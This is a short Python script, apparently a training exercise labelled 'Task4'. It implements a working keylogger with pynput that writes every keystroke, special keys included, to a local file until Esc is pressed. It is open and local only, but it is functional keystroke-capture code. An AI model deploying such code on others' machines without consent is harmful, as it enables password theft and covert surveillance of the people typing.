# Task4
from pynput.keyboard import Key, Listener

# File to store keystrokes
log_file = "key_log.txt"

def on_press(key):
    try:
        # Record regular characters
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like 'space', 'enter', etc.)
        with open(log_file, "a") as file:
            if key == Key.space:
                file.write(" [SPACE] ")
            elif key == Key.enter:
                file.write(" [ENTER]\n")
            elif key == Key.backspace:
                file.write(" [BACKSPACE] ")
            else:
                file.write(f" [{key}] ")

def on_release(key):
    # Stop the keylogger when 'esc' is pressed
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
